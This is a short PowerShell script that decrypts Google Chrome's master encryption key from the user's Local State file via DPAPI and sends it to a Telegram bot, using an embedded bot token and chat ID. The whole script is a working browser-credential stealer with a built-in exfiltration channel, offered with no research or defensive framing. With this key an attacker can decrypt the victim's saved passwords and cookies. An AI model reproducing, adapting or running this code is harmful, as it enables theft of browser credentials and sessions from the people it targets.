Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;
public class ProtectedDataWrapper {
    public static byte[] Unprotect(byte[] encryptedData) {
        return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
    }
}
"@ -ReferencedAssemblies "System.Security"

# Path to the Local State file
$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"

# Read and parse the Local State file
$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json

# Extract and decode the encrypted key
$encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)

# Remove the DPAPI prefix (first 5 bytes)
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]

# Decrypt the master key
$masterKey = [ProtectedDataWrapper]::Unprotect($encryptedKey)

# Convert the master key to a hexadecimal string
$masterKeyHex = [BitConverter]::ToString($masterKey) -replace '-', ''

# Your Telegram bot token and chat ID
$telegramBotToken = "7372575086:AAFSogrc0dZeP3POnNKIreZB4PmUb03Wn0c"
$telegramChatId = "6548118191"

# The message to send
$message = "Master Key: $masterKeyHex"

# Send the message to Telegram
$uri = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
$body = @{
    chat_id = $telegramChatId
    text    = $message
}

Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body ($body | ConvertTo-Json)

# Output the master key to the console (optional)
"Master Key: $masterKeyHex"

